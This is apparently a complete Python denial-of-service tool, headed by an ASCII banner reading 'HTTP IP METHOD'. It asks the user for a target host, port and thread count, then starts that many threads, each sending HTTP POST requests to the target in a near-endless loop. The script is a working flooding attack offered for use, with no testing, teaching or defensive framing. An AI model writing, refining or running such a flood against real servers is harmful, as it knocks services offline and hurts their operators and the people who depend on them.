import urllib3
import threading

inf=1000000000000

http = urllib3.PoolManager()

print('''
╦ ╦╔╦╗╔╦╗╔═╗  ╦╔═╗  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
╠═╣ ║  ║ ╠═╝  ║╠═╝  ║║║║╣  ║ ╠═╣║ ║ ║║
╩ ╩ ╩  ╩ ╩    ╩╩    ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝
-- Target IP must accept HTTP requests -- [post]
						  [L4 & L7]
''')
print("dont add http://")
print(" ")

target = input("Target: ")
port = input("Port: ")
threadcount = input("Threads: ")

target = "http://"+target+":"+port

def httpget():
	for i in range(1, inf):
		try:
			http.request('POST', target)
		except Exception as e:
				print(e)

def threader():
		global threads
		threads=[]
		for i in range(int(threadcount)):
				t=threading.Thread(target=httpget)
				threads.append(t)
				t.start()
threader()
